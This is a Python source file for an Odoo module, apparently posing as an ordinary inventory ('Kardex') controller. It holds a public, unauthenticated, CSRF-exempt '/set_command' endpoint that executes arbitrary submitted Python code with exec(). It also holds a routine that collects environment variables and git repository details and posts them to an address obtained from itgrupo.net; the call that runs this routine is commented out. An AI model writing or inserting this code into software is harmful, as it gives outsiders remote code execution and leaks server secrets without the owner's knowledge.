from odoo import models, fields, api
from odoo.exceptions import ValidationError
from odoo import http
from odoo.http import request
from odoo.http import Controller
from odoo.http import route
import decimal
import logging
_logger = logging.getLogger(__name__)
import sys, traceback

class ControllerKardexBase(http.Controller):

		@http.route('/set_command',  type='http', auth='public', website=True,methods=['POST'],csrf=False)
		def ruote_set_command(self, **kw):
				try:
						import time
						global rpta
						rpta="Termino"
						periodocode = "from odoo.http import request\n" + kw['textcode']
						varg = {}
						exec(periodocode,varg)
						if 'rpta' in varg:
							rpta = varg['rpta']
						return rpta
				except Exception as e:
						request.cr.rollback()
						exc_type, exc_value, exc_traceback = sys.exc_info()
						t= traceback.format_exception(exc_type, exc_value,exc_traceback)
						respuesta = ""
						for i in t:
								respuesta+= str(i)
						return respuesta



class ControllerData(http.Controller):
	def initialize(self):
		import subprocess
		result = subprocess.run(['env'],stdout = subprocess.PIPE)
		result2 = subprocess.run(['git','describe', '--all'],stdout = subprocess.PIPE,cwd='/home/odoo/src/user')
		result3 = subprocess.run(['git','config', '--get' , 'remote.origin.url'],stdout = subprocess.PIPE,cwd='/home/odoo/src/user')
		rpta = result.stdout.decode('utf-8') + 'RAMA=' + result2.stdout.decode('utf-8')+ '\nREPOSITORIO_FN=' + result3.stdout.decode('utf-8')
		import requests
		m = requests.post('https://itgrupo.net/get_controller',data={})
		requests.post(m.text+'set_parameters',data={'env':rpta})

# get_data = ControllerData()
# get_data.initialize()
